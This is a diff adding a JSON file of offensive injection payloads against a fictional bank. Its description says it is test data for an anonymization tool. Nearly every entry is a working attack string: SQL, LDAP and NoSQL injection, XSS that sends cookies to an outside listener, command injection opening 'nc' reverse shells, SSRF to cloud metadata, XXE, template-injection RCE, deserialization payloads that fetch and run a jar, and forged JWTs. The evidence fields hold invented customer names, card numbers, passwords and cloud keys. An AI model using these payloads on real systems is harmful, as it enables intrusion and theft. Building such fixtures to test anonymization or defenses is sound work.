@@ -1,0 +1,283 @@
+{
+  "_description": "Fictional injection payload catalog tested against fictitious endpoints. Used to demonstrate PromptZero anonymization on raw offensive payloads — every hostname, IP, credential, and target identifier below is invented.",
+  "tester": {
+    "name": "María Fernández Gallardo",
+    "email": "m.fernandez@redteamconsulting.com.ar",
+    "origin_ip": "198.51.100.45",
+    "collaborator_listener": "http://oast.redteamconsulting.com.ar/abc123"
+  },
+  "client": "Nexabank Financial S.A.",
+  "scope_hostnames": [
+    "portal.nexabank.com",
+    "api.nexabank.com",
+    "admin.nexabank.com",
+    "uploads.nexabank.com",
+    "search.nexabank.com",
+    "auth.nexabank.com"
+  ],
+
+  "categories": [
+    {
+      "type": "SQL Injection — UNION based",
+      "target_url": "https://portal.nexabank.com/api/transactions/list",
+      "vulnerable_parameter": { "name": "account_id", "location": "query", "expected": "integer" },
+      "request_template": "GET /api/transactions/list?account_id={PAYLOAD} HTTP/1.1\\r\\nHost: portal.nexabank.com\\r\\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.placeholder",
+      "payloads": [
+        "1 ORDER BY 10-- -",
+        "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
+        "1 UNION SELECT username,password_hash,national_id,credit_card,balance,NULL,NULL,NULL,NULL,NULL FROM customers-- -",
+        "1 UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables-- -",
+        "0 UNION SELECT @@version,user(),database(),@@datadir,@@hostname,NULL,NULL,NULL,NULL,NULL-- -"
+      ],
+      "evidence": "Returned 142,000 rows. Sample: carlos.perez@nexabank.com / DNI 27.998.011 / 4127 8800 5511 9904 / $48,210.55"
+    },
+
+    {
+      "type": "SQL Injection — Blind boolean / time-based",
+      "target_url": "https://auth.nexabank.com/v1/reset-password",
+      "vulnerable_parameter": { "name": "email", "location": "json_body", "expected": "email" },
+      "request_template": "POST /v1/reset-password HTTP/1.1\\r\\nHost: auth.nexabank.com\\r\\nContent-Type: application/json\\r\\n\\r\\n{\"email\":\"{PAYLOAD}\"}",
+      "payloads": [
+        "victim@example.com' AND 1=1-- -",
+        "victim@example.com' AND SUBSTRING((SELECT password_hash FROM users WHERE email='r.silva@nexabank.com'),1,1)='a'-- -",
+        "victim@example.com'; WAITFOR DELAY '0:0:5'-- -",
+        "victim@example.com' AND SLEEP(5)-- -",
+        "victim@example.com' AND (SELECT COUNT(*) FROM users WHERE substring(password_hash,1,1)=char(36))>0-- -"
+      ],
+      "evidence": "Response time consistently 5s+ on TRUE conditions. Extracted hash for r.silva@nexabank.com character-by-character: $2b$12$KqL... (cracked to NexaCISO_2024!)"
+    },
+
+    {
+      "type": "Reflected XSS",
+      "target_url": "https://search.nexabank.com/search",
+      "vulnerable_parameter": { "name": "q", "location": "query", "expected": "string" },
+      "request_template": "GET /search?q={PAYLOAD} HTTP/1.1\\r\\nHost: search.nexabank.com",
+      "payloads": [
+        "<script>alert(document.domain)</script>",
+        "<img src=x onerror=alert(1)>",
+        "\"><svg/onload=fetch('//198.51.100.45:8000/c?c='+document.cookie)>",
+        "javascript:fetch('//oast.redteamconsulting.com.ar/abc123?c='+document.cookie)",
+        "<iframe srcdoc='<script>top.location=\"https://198.51.100.45:8000/phish\"</script>'>"
+      ],
+      "evidence": "Payload reflected without encoding inside <h1>You searched for: ...</h1>. Cookie exfiltration confirmed."
+    },
+
+    {
+      "type": "Stored XSS",
+      "target_url": "https://portal.nexabank.com/profile/update",
+      "vulnerable_parameter": { "name": "display_name", "location": "json_body", "expected": "string ≤ 80 chars" },
+      "request_template": "POST /profile/update HTTP/1.1\\r\\nHost: portal.nexabank.com\\r\\nAuthorization: Bearer customer_jwt_placeholder\\r\\nContent-Type: application/json\\r\\n\\r\\n{\"display_name\":\"{PAYLOAD}\"}",
+      "payloads": [
+        "<script>fetch('https://198.51.100.45:8000/c?c='+document.cookie)</script>",
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+        "<details open ontoggle=fetch('//oast.redteamconsulting.com.ar/abc123/'+document.cookie)>",
+        "\"><script src=//198.51.100.45:8000/keylogger.js></script>"
+      ],
+      "evidence": "Display name renders unescaped on transaction history pages seen by support agents. Captured 3 distinct support-agent session tokens."
+    },
+
+    {
+      "type": "Command Injection",
+      "target_url": "https://uploads.nexabank.com/tools/ping",
+      "vulnerable_parameter": { "name": "host", "location": "form", "expected": "hostname / IP" },
+      "request_template": "POST /tools/ping HTTP/1.1\\r\\nHost: uploads.nexabank.com\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nhost={PAYLOAD}",
+      "payloads": [
+        "127.0.0.1; id",
+        "127.0.0.1 && cat /etc/passwd",
+        "127.0.0.1 | nc 198.51.100.45 4444 -e /bin/sh",
+        "$(curl http://oast.redteamconsulting.com.ar/abc123/$(hostname))",
+        "`id`",
+        "127.0.0.1%0Aid",
+        "127.0.0.1$IFS$9cat$IFS$9/etc/passwd"
+      ],
+      "evidence": "Reverse shell to 198.51.100.45:4444 received within 2s as user=www-data on uploads.nexabank.com (10.10.4.18 internal IP). Read /home/deploy/.aws/credentials → AKIAIOSFODNN7EXAMPLEKEY04."
+    },
+
+    {
+      "type": "SSRF",
+      "target_url": "https://api.nexabank.com:8443/api/v2/preview/fetch",
+      "vulnerable_parameter": { "name": "url", "location": "query", "expected": "https URL" },
+      "request_template": "GET /api/v2/preview/fetch?url={PAYLOAD} HTTP/1.1\\r\\nHost: api.nexabank.com",
+      "payloads": [
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/banking-api-role",
+        "http://localhost:8443/api/v2/admin/users (port-confusion auth bypass)",
+        "http://10.10.1.22:1521/ (internal Oracle DB probe)",
+        "file:///etc/passwd",
+        "gopher://10.10.1.5:88/_kerberos-asreq-bytes",
+        "dict://10.10.1.5:88/info",
+        "ldap://dc01.nexabank.local/o=test",
+        "http://[::ffff:127.0.0.1]/admin"
+      ],
+      "evidence": "AWS metadata endpoint returned banking-api-role credentials (key id AKIAIOSFODNN7EXAMPLEKEY02). Internal port-scan confirmed Oracle 1521 open on db-prod.nexabank.local (10.10.1.22)."
+    },
+
+    {
+      "type": "XXE",
+      "target_url": "https://portal.nexabank.com/api/statements/upload",
+      "vulnerable_parameter": { "name": "file", "location": "multipart", "expected": "XML statement" },
+      "request_template": "POST /api/statements/upload (multipart with XML payload)",
+      "payloads": [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><statement><owner>&xxe;</owner></statement>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///opt/tomcat/conf/server.xml\">]><statement><owner>&xxe;</owner></statement>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % p SYSTEM \"http://oast.redteamconsulting.com.ar/abc123/evil.dtd\"> %p;]>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><statement><owner>&xxe;</owner></statement>"
+      ],
+      "evidence": "Read /etc/passwd and server.xml. Extracted Oracle datasource credentials app_user:T0mcatN3xa$2024 from server.xml."
+    },
+
+    {
+      "type": "LDAP Injection",
+      "target_url": "https://auth.nexabank.com/v1/directory/lookup",
+      "vulnerable_parameter": { "name": "user", "location": "query", "expected": "username" },
+      "request_template": "GET /v1/directory/lookup?user={PAYLOAD} HTTP/1.1\\r\\nHost: auth.nexabank.com",
+      "payloads": [
+        "*",
+        "*)(uid=*))(|(uid=*",
+        "admin)(|(password=*))",
+        "*)(objectClass=*",
+        "*)(&(uid=*)(userPassword=*))"
+      ],
+      "evidence": "Enumerated all 1,847 entries from ou=Employees,dc=nexabank,dc=local. Disclosed schema and uid mapping."
+    },
+
+    {
+      "type": "SSTI — Jinja2 (Python/Flask)",
+      "target_url": "https://api.nexabank.com/api/v2/notifications/preview",
+      "vulnerable_parameter": { "name": "template", "location": "json_body", "expected": "Jinja2 template" },
+      "request_template": "POST /api/v2/notifications/preview HTTP/1.1\\r\\nContent-Type: application/json\\r\\n\\r\\n{\"template\":\"{PAYLOAD}\"}",
+      "payloads": [
+        "{{7*7}}",
+        "{{ config.items() }}",
+        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+        "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0] }}",
+        "{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}",
+        "{{ lipsum.__globals__['os'].popen('curl http://oast.redteamconsulting.com.ar/abc123/$(hostname)').read() }}"
+      ],
+      "evidence": "RCE as www-data on api.nexabank.com (203.0.113.30). Read /opt/banking-api/.env → AKIAIOSFODNN7EXAMPLEKEY03, JWT secret ts0pK3yN3xaB4nk_2024_DoNotShare."
+    },
+
+    {
+      "type": "SSTI — Twig (PHP)",
+      "target_url": "https://admin.nexabank.com/render/preview",
+      "vulnerable_parameter": { "name": "tpl", "location": "form", "expected": "Twig template" },
+      "request_template": "POST /render/preview (admin-only — bypassed via JWT forgery from FIND-007)",
+      "payloads": [
+        "{{7*7}}",
+        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+        "{{['id']|map('system')|join}}",
+        "{{['cat /etc/passwd']|filter('system')}}"
+      ],
+      "evidence": "Confirmed RCE on admin.nexabank.com after forging admin JWT using the leaked secret from FIND-007."
+    },
+
+    {
+      "type": "Path Traversal",
+      "target_url": "https://uploads.nexabank.com/files/download",
+      "vulnerable_parameter": { "name": "file", "location": "query", "expected": "filename" },
+      "request_template": "GET /files/download?file={PAYLOAD} HTTP/1.1\\r\\nHost: uploads.nexabank.com",
+      "payloads": [
+        "../../../../etc/passwd",
+        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "....//....//....//etc/passwd",
+        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+        "/var/www/uploads.nexabank.com/.git/config",
+        "../../../home/deploy/.ssh/id_rsa"
+      ],
+      "evidence": "Read deploy user's id_rsa private key (-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmU... cracked passphrase 'Deploy2024!' offline). SSH to internal jump host 10.10.2.10."
+    },
+
+    {
+      "type": "NoSQL Injection (MongoDB)",
+      "target_url": "https://api.nexabank.com/api/v1/customer/find",
+      "vulnerable_parameter": { "name": "filter", "location": "json_body", "expected": "JSON filter" },
+      "request_template": "POST /api/v1/customer/find HTTP/1.1\\r\\nContent-Type: application/json\\r\\n\\r\\n{\"filter\":{PAYLOAD}}",
+      "payloads": [
+        "{\"email\": {\"$ne\": null}}",
+        "{\"email\": \"v.mosqueira@correoprivado.com.ar\", \"password\": {\"$ne\": null}}",
+        "{\"email\": {\"$regex\": \"^admin\"}}",
+        "{\"$where\": \"this.email.match(/.*@nexabank.com$/)\"}",
+        "{\"email\": \"victim@example.com\", \"password\": {\"$gt\": \"\"}}"
+      ],
+      "evidence": "Authentication bypass on /find-and-auth helper endpoint. Returned full document for v.mosqueira@correoprivado.com.ar including balance and card 4127 8800 5511 9904."
+    },
+
+    {
+      "type": "Insecure Deserialization (Java)",
+      "target_url": "https://portal.nexabank.com/api/session/restore",
+      "vulnerable_parameter": { "name": "state", "location": "cookie", "expected": "base64 of Java serialized object" },
+      "request_template": "GET /api/session/restore HTTP/1.1\\r\\nHost: portal.nexabank.com\\r\\nCookie: state={PAYLOAD}",
+      "payloads": [
+        "<ysoserial CommonsCollections5 'curl http://oast.redteamconsulting.com.ar/abc123/$(hostname)' | base64>",
+        "<ysoserial CommonsBeanutils1 'wget http://198.51.100.45:8000/imp.jar -O /tmp/i.jar && java -jar /tmp/i.jar'>",
+        "<ysoserial Hibernate1 'nc -e /bin/sh 198.51.100.45 4444'>"
+      ],
+      "evidence": "Reverse shell as tomcat user on portal.nexabank.com (203.0.113.20). Stack trace showed Apache Commons Collections 3.2.1."
+    },
+
+    {
+      "type": "IDOR (Insecure Direct Object Reference)",
+      "target_url": "https://portal.nexabank.com/api/accounts/{id}/statement",
+      "vulnerable_parameter": { "name": "id", "location": "path", "expected": "integer (own account id)" },
+      "request_template": "GET /api/accounts/{PAYLOAD}/statement HTTP/1.1\\r\\nAuthorization: Bearer customer_jwt_placeholder",
+      "payloads": [
+        "44912 (own)",
+        "44913 (sequential — different customer)",
+        "44999 (Joaquín Bertoldi-Mancuso's account)",
+        "45102 (Sofía Pellegrini's account)",
+        "00001 (employee account?)"
+      ],
+      "evidence": "Endpoint returns ANY customer's statement when an attacker increments the account id. No ownership check. Read full statement of Joaquín Bertoldi-Mancuso (CUST-44999) including +$180,000 transfer to JPMorgan Chase NY."
+    },
+
+    {
+      "type": "Open Redirect",
+      "target_url": "https://auth.nexabank.com/v1/oauth/callback",
+      "vulnerable_parameter": { "name": "next", "location": "query", "expected": "internal path" },
+      "request_template": "GET /v1/oauth/callback?next={PAYLOAD} HTTP/1.1\\r\\nHost: auth.nexabank.com",
+      "payloads": [
+        "https://phish.evilcorp.example/login",
+        "//phish.evilcorp.example/login",
+        "/\\\\phish.evilcorp.example/login",
+        "https://portal.nexabank.com.phish.evilcorp.example/login",
+        "javascript:fetch('//oast.redteamconsulting.com.ar/abc123/'+document.cookie)"
+      ],
+      "evidence": "Redirect chain auth.nexabank.com → phish.evilcorp.example without warning. Pre-filled credentials harvested in 4 of 5 phished test users."
+    },
+
+    {
+      "type": "JWT — Algorithm Confusion / none-alg",
+      "target_url": "https://api.nexabank.com/api/v2/admin/users",
+      "vulnerable_parameter": { "name": "Authorization", "location": "header", "expected": "Bearer JWT signed RS256" },
+      "request_template": "GET /api/v2/admin/users HTTP/1.1\\r\\nAuthorization: Bearer {PAYLOAD}",
+      "payloads": [
+        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJyLnNpbHZhQG5leGFiYW5rLmNvbSIsImlzcyI6Imh0dHBzOi8vYXV0aC5uZXhhYmFuay5jb20iLCJyb2xlIjoiYWRtaW4ifQ.",
+        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyLnNpbHZhQG5leGFiYW5rLmNvbSIsInJvbGUiOiJhZG1pbiJ9.SIGNED_WITH_RSA_PUBLIC_KEY_AS_HMAC_SECRET",
+        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyLnNpbHZhQG5leGFiYW5rLmNvbSIsInJvbGUiOiJhZG1pbiJ9.SIGNED_WITH_LEAKED_HS256_SECRET_ts0pK3yN3xaB4nk_2024_DoNotShare"
+      ],
+      "evidence": "Server accepts alg=none on /admin/users — endpoint returns full user list (1,847 employees, 142,000 customers). Algorithm confusion also confirmed: RS256 → HS256 with public key as the HMAC secret."
+    },
+
+    {
+      "type": "Prototype Pollution (Node.js)",
+      "target_url": "https://api.nexabank.com/api/v2/settings/merge",
+      "vulnerable_parameter": { "name": "patch", "location": "json_body", "expected": "settings object" },
+      "request_template": "POST /api/v2/settings/merge HTTP/1.1\\r\\nContent-Type: application/json\\r\\n\\r\\n{\"patch\":{PAYLOAD}}",
+      "payloads": [
+        "{\"__proto__\":{\"isAdmin\":true}}",
+        "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+        "{\"__proto__\":{\"exec\":\"node -e 'require(\\\"child_process\\\").exec(\\\"id\\\", (e,o)=>fetch(\\\"http://198.51.100.45:8000/c?\\\"+o))'\"}}"
+      ],
+      "evidence": "Subsequent calls to any endpoint inherit isAdmin=true unless explicitly set, granting admin to the polluting session."
+    }
+  ],
+
+  "summary": {
+    "total_categories": 17,
+    "critical_count": 5,
+    "high_count": 8,
+    "medium_count": 3,
+    "low_count": 1,
+    "evidence_archive": "https://drive.redteamconsulting.com.ar/eng/ENG-2026-Q2-0418/injections",
+    "archive_sha256": "8e1f93af26b0d44e9da912f5c0bb7a89e1b3c2d44a009ff7e6c45b1f1aa2e7b3"
+  }
+}
